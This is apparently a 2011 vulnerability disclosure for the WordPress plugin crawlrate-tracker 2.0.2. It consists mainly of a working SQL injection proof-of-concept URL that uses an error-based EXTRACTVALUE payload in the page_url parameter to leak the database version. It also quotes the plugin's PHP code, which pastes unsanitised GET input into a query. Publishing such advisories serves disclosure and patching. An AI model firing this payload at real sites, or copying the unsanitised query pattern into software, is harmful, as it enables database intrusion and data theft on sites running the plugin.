# Date: 2011-08-30
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 2.0.2 (tested)
# Note: magic_quotes has to be turned off
 
---
PoC
---
http://www.site.com/wp-content/plugins/crawlrate-tracker/sbtracking-chart-data.php?chart_data=1&page_url=-1&#039; AND EXTRACTVALUE(1, CONCAT(CHAR(58),@@version,CHAR(58)))--%20
 
---------------
Vulnerable code
---------------
class b3_chartData extends b3_sbTrackingConfig
{
    public function tracking_bot_report_chart_data()
    {
        ...
        if($_GET[&#039;page_url&#039;] != &#039;&#039;)
        {
            $bots = $this->wpdb->get_results("SELECT DATE(FROM_UNIXTIME(`visit_time`)) `visit_date`,`robot_name`,COUNT(*) `total` FROM $this->sbtracking_table WHERE `visit_time` >= &#039;$start&#039; AND `visit_time` <= &#039;$end&#039; AND `page_url` = &#039;" . $_GET[&#039;page_url&#039;] . "&#039; GROUP BY `visit_date`,`robot_name`");
            ...
 
if ($_GET[&#039;chart_data&#039;]==1) {
    ...
    $chartData = new b3_chartData();
    echo $chartData->tracking_bot_report_chart_data();



